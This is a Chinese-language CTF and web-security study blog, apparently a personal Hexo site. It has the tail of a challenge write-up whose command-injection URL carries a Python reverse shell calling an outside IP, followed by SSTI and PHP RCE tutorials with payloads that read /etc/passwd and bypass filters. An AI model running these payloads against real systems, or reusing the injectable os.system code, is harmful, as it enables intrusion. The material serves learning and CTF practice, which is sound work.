class="keyword">else</span>:</span><br><span class="line">                flash(<span class="string">&#x27;Invalid password&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            session[<span class="string">&#x27;username&#x27;</span>] = username</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        &lt;h1&gt;Login&lt;/h1&gt;</span></span><br><span class="line"><span class="string">        &lt;h2&gt;No need to register.&lt;/h2&gt;</span></span><br><span class="line"><span class="string">        &lt;form action=&quot;/login&quot; method=&quot;post&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;label for=&quot;username&quot;&gt;Username:&lt;/label&gt;</span></span><br><span class="line"><span class="string">            &lt;input type=&quot;text&quot; id=&quot;username&quot; name=&quot;username&quot; required&gt;</span></span><br><span class="line"><span class="string">            &lt;br&gt;</span></span><br><span class="line"><span class="string">            &lt;label for=&quot;password&quot;&gt;Password:&lt;/label&gt;</span></span><br><span class="line"><span class="string">            &lt;input type=&quot;password&quot; id=&quot;password&quot; name=&quot;password&quot; required&gt;</span></span><br><span class="line"><span class="string">            &lt;br&gt;</span></span><br><span class="line"><span class="string">            &lt;input type=&quot;submit&quot; value=&quot;Login&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;/form&gt;</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upload&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> session.get(<span class="string">&#x27;username&#x27;</span>):</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        f = request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">        file_path = <span class="built_in">str</span>(uuid.uuid4()) + <span class="string">&#x27;_&#x27;</span> + f.filename</span><br><span class="line">        f.save(<span class="string">&#x27;./uploads/&#x27;</span> + file_path)</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">f&#x27;/upload?file_path=<span class="subst">&#123;file_path&#125;</span>&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> request.args.get(<span class="string">&#x27;file_path&#x27;</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">            &lt;h1&gt;Upload Image&lt;/h1&gt;</span></span><br><span class="line"><span class="string">            </span></span><br><span class="line"><span class="string">            &lt;form action=&quot;/upload&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;input type=&quot;file&quot; name=&quot;file&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;input type=&quot;submit&quot; value=&quot;Upload&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;/form&gt;</span></span><br><span class="line"><span class="string">            &#x27;&#x27;&#x27;</span></span><br><span class="line">            </span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            file_path = <span class="string">&#x27;./uploads/&#x27;</span> + request.args.get(<span class="string">&#x27;file_path&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> session.get(<span class="string">&#x27;username&#x27;</span>) != <span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">                <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    content = f.read()</span><br><span class="line">                    b64 = base64.b64encode(content)</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">f&#x27;&lt;img src=&quot;data:image/png;base64,<span class="subst">&#123;b64.decode()&#125;</span>&quot; alt=&quot;Uploaded Image&quot;&gt;&#x27;</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                os.system(<span class="string">f&#x27;base64 <span class="subst">&#123;file_path&#125;</span> &gt; /tmp/<span class="subst">&#123;file_path&#125;</span>.b64&#x27;</span>)</span><br><span class="line">                <span class="comment"># with open(f&#x27;/tmp/&#123;file_path&#125;.b64&#x27;, &#x27;r&#x27;) as f:</span></span><br><span class="line">                <span class="comment">#     return f&#x27;&lt;img src=&quot;data:image/png;base64,&#123;f.read()&#125;&quot; alt=&quot;Uploaded Image&quot;&gt;&#x27;</span></span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;Sorry, but you are not allowed to view this image.&#x27;</span></span><br><span class="line">                </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure>

<p>发现需要admin权限之后会有一个无回显的命令拼接执行，把哈希值拿去在线网站解密如下：</p>
<p><img src="https://cdn.jsdelivr.net/gh/yatq21/Pictures@master/Blog/study/image-20250426161323268.png" alt="image-20250426161323268"></p>
<p>得到admin账户的密码，登录admin账户之后就发现确实是无回显，这里我尝试了好几次反弹shell，好像是环境的问题，后面才成功终于反弹成功。</p>
<p>这里贴一下总结反弹shell命令的文章：</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44288604/article/details/111740527">反弹shell汇总，看我一篇就够了-CSDN博客</a></p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">http</span>://<span class="number">223.112.5.141:55140</span>/upload?file_path=<span class="number">111</span>;python -c <span class="string">&quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#x27;156.226.172.136&#x27;,9001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#x27;/bin/bash&#x27;,&#x27;-i&#x27;]);&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>拿到flag。</p>
<p><img src="https://cdn.jsdelivr.net/gh/yatq21/Pictures@master/Blog/study/image-20250426161215818.png" alt="image-20250426161215818"></p>
<h2 id="eznote"><a href="#eznote" class="headerlink" title="eznote"></a>eznote</h2><p><strong>描述</strong>：</p>
<p>your favorite frontend challenge</p>
<p>附件：b5</p>
<h2 id="Excellent-Site"><a href="#Excellent-Site" class="headerlink" title="Excellent-Site"></a>Excellent-Site</h2><p><strong>描述</strong>：</p>
<p>My site is PERFECT!!!<br>hosts: 0.0.0.0 ezmail.org</p>
<p>附件：5a</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://yatq.xyz/web%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E7%AC%94%E8%AE%B0/SSTI/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/wz.jpg">
      <meta itemprop="name" content="y@7q">
      <meta itemprop="description" content="心不畏死，踏屍前行">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="y@7q">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/web%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E7%AC%94%E8%AE%B0/SSTI/" class="post-title-link" itemprop="url">SSTI学习</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2025-04-20 13:36:09" itemprop="dateCreated datePublished" datetime="2025-04-20T13:36:09+08:00">2025-04-20</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2025-06-30 00:52:36" itemprop="dateModified" datetime="2025-06-30T00:52:36+08:00">2025-06-30</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E6%90%AD%E5%BB%BA/" itemprop="url" rel="index"><span itemprop="name">基础知识搭建</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>3k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>3 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h1><h2 id="模板引擎"><a href="#模板引擎" class="headerlink" title="模板引擎"></a>模板引擎</h2><p>SSTI 就是服务器端模板注入（Server-Side Template Injection）</p>
<p>Web开发中,模板引擎是为了使得用户界面和业务逻辑处理分离所产生。而SSTI的成因则是因为服务端没有对用户的输入做很好的处理而产生。</p>
<p>我们最常见到的模板语言便是jinja2，它是Flask框架一部分。它能够用于替换变量，将动态数据渲染到静态 HTML 页面。格式如下：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">变量：</span><br><span class="line">&#123;&#123;username&#125;&#125;</span><br><span class="line">控制语句：</span><br><span class="line">&#123;% for comment in comments %&#125;</span><br><span class="line">     <span class="tag">&lt;<span class="name">li</span>&gt;</span>&#123;&#123;comment&#125;&#125;<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">&#123;% endfor %&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>通常在flask渲染html之前会有一个本地的html界面来作为模板，位于app.py同目录下的<code>templates</code>之下，</p>
<p>这里给出示例：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>SSTI<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">h3</span>&gt;</span>Hello, &#123;&#123;name&#125;&#125;<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>其中hello是静态的，而被<code>&#123;&#123;&#125;&#125;</code>包裹的name则可以被动态的替换，而执行这一替换逻辑就是app.py的任务。</p>
<p>我们给出以下示例代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template</span><br><span class="line"></span><br><span class="line">app = Flask(__name__) <span class="comment">#__name__是一种属性一样的东西，通常指向该文件的文件名__main__，如果是外部调用得到则有可能是app</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>) </span></span><br><span class="line"><span class="comment">#设置路由，get方式获取传递的参数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello_world</span>():</span><br><span class="line">    query = request.args.get(<span class="string">&#x27;name&#x27;</span>) <span class="comment"># GET取参数name的值</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;test.html&#x27;</span>, name=query) <span class="comment">#将name的值传入模板,进行渲染</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">5000</span>, debug=<span class="literal">True</span>)</span><br><span class="line"> <span class="comment">#让操作系统监听所有公网 IP,此时便可以在公网上看到自己的web，同时开启debug，方便调试。开启debug后直接刷新页面就可以看到更改的界面</span></span><br></pre></td></tr></table></figure>

<p>除了用query &#x3D; request.args.get(‘name’)来获取参数传递，也可以通过 URL 路径参数 (<code>/&lt;name&gt;</code>) 获取。，该方法支持参数类型的限制，例如 <code>&lt;int:id&gt;</code>。</p>
<h2 id="模板注入"><a href="#模板注入" class="headerlink" title="模板注入"></a>模板注入</h2><blockquote>
<p><strong>凡是使用模板的地方都可能会出现 SSTI 的问题，SSTI 不属于任何一种语言，沙盒绕过也不是</strong></p>
</blockquote>
<p>通常有很多各个语言的常见框架，不同模板则有着不同的语法，总结如下：</p>
<p><strong>附表</strong></p>
<p><img src="https://cdn.jsdelivr.net/gh/yatq21/Pictures@master/Blog/study/1344396-20200911174631687-758048107.png" alt="img"></p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/SSTI/image-20200521204901527.png" alt="img"></p>
<p>上图为判断模板的方法，绿色线表示执行了，红线则表示没有。</p>
<p>以mako模板的靶场为例：</p>
<p>先输入<code>$&#123;7*7&#125;</code>,回显为49，于是再输入<code>a&#123;*comment*&#125;b</code>,</p>
<p><img src="https://raw.githubusercontent.com/yatq21/Pictures/main/Blog/study/image-20250511200647083.png" alt="image-20250511200647083"></p>
<p>未执行，于是再使用<code>$&#123;&quot;z&quot;.join(&quot;ab&quot;)&#125;</code>，</p>
<p><img src="https://raw.githubusercontent.com/yatq21/Pictures/main/Blog/study/image-20250511200746361.png" alt="image-20250511200746361"></p>
<p>成功执行，现在我们便判断出了模板类型为Mako。</p>
<h2 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h2><p>一般就是靠继承链先得到父类再看其中有没有什么可以利用的恶意方法函数之类的能够导致命令执行，从而拿到flag。以下是一些魔术方法，我们用他们来构造继承链：</p>
<ul>
<li><code>__class__</code></li>
</ul>
<p><strong>class</strong>用于返回该对象所属的类，比如某个字符串，他的对象为字符串对象，而其所属的类为<code>&lt;class &#39;str&#39;&gt;</code>。</p>
<ul>
<li><code>__bases__</code></li>
</ul>
<p>以元组的形式返回一个类所直接继承的类。</p>
<ul>
<li><code>__base__</code></li>
</ul>
<p>以字符串返回一个类所直接继承的类。</p>
<ul>
<li><code>__mro__</code></li>
</ul>
<p>返回解析方法调用的顺序。</p>
<ul>
<li><code>__subclasses__()</code></li>
</ul>
<p>获取类的所有子类。</p>
<ul>
<li><code>__init__</code></li>
</ul>
<p>所有自带带类都包含<strong>init</strong>方法，便于利用他当跳板来调用<strong>globals</strong>。</p>
<ul>
<li><code>__globals__</code></li>
</ul>
<p><code>function.__globals__</code>，用于获取function所处空间下可使用的module、方法以及所有变量。</p>
<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;</span>.__class__.__mro__[<span class="number">1</span>].__subclasses__().__init__.__globals__</span><br></pre></td></tr></table></figure>

<p>这是一套构造的利用链，可以看到object类的所有子类，然后利用<code>.__init__.__globals__</code>来找到有没有os module或者其他的可以读写文件的。可以用python脚本进行爆破。</p>
<h2 id="SSTI绕过"><a href="#SSTI绕过" class="headerlink" title="SSTI绕过"></a>SSTI绕过</h2><h3 id="绕过"><a href="#绕过" class="headerlink" title="[]绕过"></a>[]绕过</h3><p>用<code>__getitem__(2)</code>或者<code>.pop(2)</code>来绕过，假如.也被绕过</p>
<h3 id="绕过-1"><a href="#绕过-1" class="headerlink" title=".绕过"></a>.绕过</h3><figure class="highlight ceylon"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;</span>.<span class="number">__</span><span class="keyword">class</span><span class="number">__</span>等价于<span class="string">&quot;&quot;</span>[<span class="string">&quot;__class__&quot;</span>]</span><br></pre></td></tr></table></figure>

<h3 id="“”绕过"><a href="#“”绕过" class="headerlink" title="“”绕过"></a>“”绕过</h3><p>一般是用于索引或者路径，可以用request.args来进行绕过，把其当作变量来填充即可。</p>
<h3 id="绕过-2"><a href="#绕过-2" class="headerlink" title="_绕过"></a>_绕过</h3><p>也同样可以用request.args,或者request.form两个传参来绕过（对应GET和POST）</p>
<p>示例：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; <span class="string">&#x27;&#x27;</span>[request.args.<span class="keyword">class</span>][request.args.mro][<span class="number">2</span>][request.args.subclasses]()[<span class="number">40</span>](<span class="string">&#x27;/etc/passwd&#x27;</span>).read() &#125;&#125;&amp;<span class="keyword">class</span>=____class____&amp;mro=____mro____&amp;subclasses=____subclasses____</span><br></pre></td></tr></table></figure>



<h3 id="关键字绕过"><a href="#关键字绕过" class="headerlink" title="关键字绕过"></a>关键字绕过</h3><h4 id="字符串拼接"><a href="#字符串拼接" class="headerlink" title="字符串拼接"></a>字符串拼接</h4><p>可用加号拆分，使用中括号的payload：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&quot;&quot;</span>[<span class="string">&quot;__cla&quot;</span>+<span class="string">&quot;ss__&quot;</span>]&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>不使用中括号的payload：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&quot;&quot;</span>.__getattribute__(<span class="string">&quot;__cla&quot;</span>+<span class="string">&quot;ss__&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>

<h4 id="Base64绕过"><a href="#Base64绕过" class="headerlink" title="Base64绕过"></a>Base64绕过</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;[].____getattribute____(<span class="string">&#x27;X19jbGFzc19f&#x27;</span>.decode(<span class="string">&#x27;base64&#x27;</span>)).____base____.____subclasses____()[<span class="number">40</span>](<span class="string">&quot;/etc/passwd&quot;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>



<h3 id="自动化绕过工具"><a href="#自动化绕过工具" class="headerlink" title="自动化绕过工具"></a>自动化绕过工具</h3><p>当然现在有很多自动化工具，比如可以看看：</p>
<p><a target="_blank" rel="noopener" href="https://github.com/Marven11/Fenjing">https://github.com/Marven11/Fenjing</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/bmjoker/p/13508538.html">1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园</a></p>
<p><a target="_blank" rel="noopener" href="https://lca.xlog.app/Flask-SSTI-ba-chang-ji-lu?locale=zh">Flask SSTI靶场记录 - lca</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/CoLo/p/14204137.html">初探 Python Flask+Jinja2 SSTI - Zh1z3ven - 博客园</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://yatq.xyz/web%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E7%AC%94%E8%AE%B0/RCE/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/wz.jpg">
      <meta itemprop="name" content="y@7q">
      <meta itemprop="description" content="心不畏死，踏屍前行">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="y@7q">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/web%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E7%AC%94%E8%AE%B0/RCE/" class="post-title-link" itemprop="url">RCE</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2025-04-19 15:29:05" itemprop="dateCreated datePublished" datetime="2025-04-19T15:29:05+08:00">2025-04-19</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2025-06-06 23:23:56" itemprop="dateModified" datetime="2025-06-06T23:23:56+08:00">2025-06-06</time>
              </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>11k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>10 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h1><h2 id="RCE基础豆知识"><a href="#RCE基础豆知识" class="headerlink" title="RCE基础豆知识"></a>RCE基础豆知识</h2><p>**RCE(Remote code execution 代码执行&amp;命令执行)**，分为命令执行和代码执行。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">代码执行：<span class="keyword">eval</span>(<span class="string">&quot;include(&#x27;flag.php&#x27;);echo &#x27;This will get the flag by eval PHP code: &#x27;.\$flag;&quot;</span>);</span><br><span class="line"></span><br><span class="line">命令执行：<span class="title function_ invoke__">system</span>(<span class="string">&quot;echo &#x27;This will get the flag by Linux bash command - cat /flag: &#x27;;cat /flag&quot;</span>);</span><br></pre></td></tr></table></figure>



<h3 id="PHP代码执行函数"><a href="#PHP代码执行函数" class="headerlink" title="PHP代码执行函数"></a>PHP代码执行函数</h3><table>
<thead>
<tr>
<th>函数</th>
<th>说明</th>
<th>示例代码</th>
</tr>
</thead>
<tbody><tr>
<td><code>$&#123;&#125;</code></td>
<td>用于复杂的变量解析，通常在字符串内用来解析变量或表达式。可以配合 <code>eval</code> 或其他动态执行代码的功能，用于间接执行代码。</td>
<td><code>eval(&#39;$&#123;flag&#125;&#39;);</code></td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.eval.php"><code>eval()</code></a></td>
<td>用于执行一个字符串作为 PHP 代码。可以执行任何有效的 PHP 代码片段。没有返回值，除非在执行的代码中明确返回。</td>
<td><code>eval(&#39;echo $flag;&#39;);</code></td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.assert.php"><code>assert()</code></a></td>
<td>测试表达式是否为真。PHP 8.0.0 之前，如果 <code>assertion</code> 是字符串，将解释为 PHP 代码并通过 <code>eval()</code> 执行。 <strong>PHP 8.0.0 后移除该功能。</strong></td>
<td><code>assert(print_r($flag));</code></td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.call-user-func.php"><code>call_user_func()</code></a></td>
<td>用于调用回调函数，可以传递多个参数给回调函数，返回回调函数的返回值。适用于动态函数调用。</td>
<td><code>call_user_func(&#39;print_r&#39;, $flag);</code></td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.create-function.php"><code>create_function()</code></a></td>
<td>创建匿名函数，接受两个字符串参数：参数列表和函数体。返回一个匿名函数的引用。 <strong>自 PHP 7.2.0 起被*废弃*，并自 PHP 8.0.0 起被*移除*。</strong></td>
<td><code>create_function(&#39;$a&#39;, &#39;echo $flag;&#39;)($a);</code></td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.array-map.php"><code>array_map()</code></a></td>
<td>将回调函数应用于数组的每个元素，返回一个新数组。适用于转换或处理数组元素。</td>
<td><code>array_map(print_r($flag), $a);</code></td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.call-user-func-array.php"><code>call_user_func_array()</code></a></td>
<td>调用回调函数，并将参数作为数组传递。适用于动态参数数量的函数调用。</td>
<td><code>call_user_func_array(print_r($flag), array());</code></td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.usort.php"><code>usort()</code></a></td>
<td>对数组进行自定义排序，接受数组和比较函数作为参数。适用于根据用户定义的规则排序数组元素。</td>
<td><code>usort($a,print_r($flag));</code></td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.array-filter.php"><code>array_filter()</code></a></td>
<td>过滤数组元素，如果提供回调函数，仅包含回调返回真值的元素；否则，移除所有等同于false的元素。适用于基于条件移除数组中的元素。</td>
<td><code>array_filter($a,print_r($flag));</code></td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.array-reduce.php"><code>array_reduce()</code></a></td>
<td>迭代一个数组，通过回调函数将数组的元素逐一减少到单一值。接受数组、回调函数和可选的初始值。</td>
<td><code>array_reduce($a,print_r($flag));</code></td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.preg-replace.php"><code>preg_replace()</code></a></td>
<td>执行正则表达式的搜索和替换。可以是单个字符串或数组。适用于基于模式匹配修改文本内容。 <strong>依赖 &#x2F;e 模式，该模式自 PHP7.3 起被取消。</strong></td>
<td><code>preg_replace(&#39;/(.*)/ei&#39;, &#39;strtolower(&quot;\\1&quot;)&#39;, $&#123;print_r($flag)&#125;);</code></td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.ob-start.php"><code>ob_start()</code></a></td>
<td>ob_start — 打开输出控制缓冲,可选回调函数作为参数来处理缓冲区内容。</td>
<td><code>ob_start(print_r($flag));</code></td>
</tr>
</tbody></table>
<h3 id="绕过技巧"><a href="#绕过技巧" class="headerlink" title="绕过技巧"></a>绕过技巧</h3><h4 id="参数逃逸"><a href="#参数逃逸" class="headerlink" title="参数逃逸"></a>参数逃逸</h4><p>示例：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">  <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |/i&quot;</span>,<span class="variable">$c</span>))   <span class="comment">//这里还过滤的.和空格</span></span><br><span class="line">  &#123;</span><br><span class="line">      <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>如果这些写c参数：<code>url?c=eval($_GET[&#39;a&#39;]);</code>，则会绕过限制。</p>
<h4 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h4><table>
<thead>
<tr>
<th>绕过方式</th>
<th>示例</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td><code>%09</code></td>
<td><code>ls%09/etc</code></td>
<td>是TAB制表符的URL编码</td>
</tr>
<tr>
<td><code>$IFS</code></td>
<td><code>ls$IFS/etc</code></td>
<td><code>$IFS</code> 是 Bash 中的内部字段分隔符，默认值是空格。</td>
</tr>
<tr>
<td><code>\t</code></td>
<td><code>ls\t/etc</code></td>
<td>Tab 字符，有时可用 <code>%09</code>（URL编码）或直接注入制表符。</td>
</tr>
<tr>
<td><code>$&#123;IFS&#125;</code></td>
<td><code>ls$&#123;IFS&#125;/etc</code></td>
<td>明确写法，防止 <code>$IFSabc</code> 被误解。</td>
</tr>
<tr>
<td><code>%20</code></td>
<td><code>ls%20/etc</code></td>
